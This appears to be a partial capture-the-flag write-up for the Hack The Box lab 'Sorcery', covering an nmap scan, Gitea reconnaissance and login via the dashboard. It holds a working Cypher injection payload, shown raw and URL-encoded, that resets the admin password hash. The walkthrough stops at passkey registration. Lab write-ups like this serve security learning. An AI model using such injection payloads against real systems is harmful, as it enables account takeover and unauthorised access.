# Nmap
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Sorcery]
└─$ nmap -sC -sV -Pn 10.10.11.73 -oN ./nmap.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 14:14 UTC
Nmap scan report for 10.10.11.73
Host is up (0.44s latency).
Not shown: 998 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 79:93:55:91:2d:1e:7d:ff:f5:da:d9:8e:68:cb:10:b9 (ECDSA)
|_  256 97:b6:72:9c:39:a9:6c:dc:01:ab:3e:aa:ff:cc:13:4a (ED25519)
443/tcp open  ssl/http nginx 1.27.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.27.1
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
| ssl-cert: Subject: commonName=sorcery.htb
| Not valid before: 2024-10-31T02:09:11
|_Not valid after:  2052-03-18T02:09:11
|_http-title: 400 The plain HTTP request was sent to HTTPS port
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.66 seconds
```
After port scan, we can found this machine is protected by `WAF`, some defenders or maybe the docker conditioner.

When I check the page `https://10.10.11.73`, then I would be redirected to `https://sorcery.htb`

So let's add `sorcery.htb` into our `/etc/hosts`

# Page check
**socery.htb**
![](images/Pasted%20image%2020250723141908.png)
From the `our repo` button, it would direct to `https://git.sorcery.htb/nicole_sullivan/infrastructure`

So let's add `git.sorcery.htb` to our `/etc/hosts`

**git.sorcery.htb**
![](images/Pasted%20image%2020250723142033.png)
We can find the version of `Gitea` is `1.22.1` and the Remote Repository of `infrastructure`
I remember version of  `Gitea 1.22.0` has the `XSS` vulnerable with the `CVE-2024-6886`, but it was fixed in the version `1.22.1`

From the issues page, we found there are some `database statement injection` not fixed completely
![](images/Pasted%20image%2020250723142553.png)
So let's check the source code of the backends
![](images/Pasted%20image%2020250723145234.png)
I just found some paths of certification, seems  not useful here.

Let's come back to `socery.htb`'s register page
![](images/Pasted%20image%2020250723150430.png)
We don't have the register key, so let's try to make a test account to check the dashboard page
![](images/Pasted%20image%2020250723150543.png)

The payload would be 
```
https://sorcery.htb/dashboard/store/607b7592-4aff-49bd-9242-1bafd2f15c6d"}) WITH result MATCH (u:User {username: 'admin'}) SET u.password = '$argon2id$v=19$m=32768,t=2,p=1$c29tZXNhbHQ$jg6VX/nBKsGnE6P0lfPr6jNbdhQiKH3PRsrj2E5gHGA' RETURN result { .*, description: 'admin password updated' } //
```
We need to encode it with URL encode.
```
https://sorcery.htb/dashboard/store/607b7592-4aff-49bd-9242-1bafd2f15c6d%22%7d)%20WITH%20result%20MATCH%20(u%3aUser%20%7busername%3a%20'admin'%7d)%20SET%20u.password%20%3d%20'%24argon2id%24v%3d19%24m%3d32768%2ct%3d2%2cp%3d1%24c29tZXNhbHQ%24jg6VX%2fnBKsGnE6P0lfPr6jNbdhQiKH3PRsrj2E5gHGA'%20RETURN%20result%20%7b%20.*%2c%20description%3a%20'admin%20password%20updated'%20%7d%20%2f%2f
```
Then we can login in by `admin:admin123`
![](images/Pasted%20image%2020250723160510.png)
When I want to come to debug page, it hints me to need a passkey
![](images/Pasted%20image%2020250723160630.png)
We have to use the `chrome` to register a passkey
Open the google tool console, press the `WebAuthn`
![](images/Pasted%20image%2020250723161246.png)